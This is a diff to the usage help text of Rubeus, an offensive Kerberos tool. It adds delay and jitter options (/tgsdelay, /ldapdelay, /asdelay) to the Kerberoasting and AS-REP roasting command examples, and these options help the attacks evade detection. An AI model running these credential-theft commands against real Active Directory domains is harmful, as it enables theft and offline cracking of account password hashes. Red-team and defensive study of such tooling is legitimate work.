@@ -177,8 +177,11 @@ namespace Rubeus.Domain
     Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
         Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]
 
-    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
-        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]
+    Perform Kerberoasting, with a delay of 5000 milliseconds between TGS requests and a jitter of 30%:
+        Rubeus.exe kerberoast /tgsdelay:5000 /jitter:30 [/ldaps] [/nowrap]
+
+    Perform Kerberoasting, with a delay of 500 seconds after the LDAP request and a jitter of 30%:
+        Rubeus.exe kerberoast /ldapdelay:500 /jitter:30 [/ldaps] [/nowrap]
 
     Perform AES Kerberoasting:
         Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]
@@ -195,6 +198,11 @@ namespace Rubeus.Domain
     Perform AS-REP ""roasting"" for any users without preauth using alternate credentials:
         Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:""OU,...""] [/ldaps] [/nowrap]
 
+    Perform AS-REP ""roasting"", with a delay of 5000 milliseconds between AS requests and a jitter of 30%:
+        Rubeus.exe asreproast /asdelay:5000 /jitter:30 [/ldaps] [/nowrap]
+
+    Perform AS-REP ""roasting"", with a delay of 500 seconds after the LDAP request and a jitter of 30%:
+        Rubeus.exe asreproast /ldapdelay:500 /jitter:30 [/ldaps] [/nowrap]
 
  Miscellaneous:
 
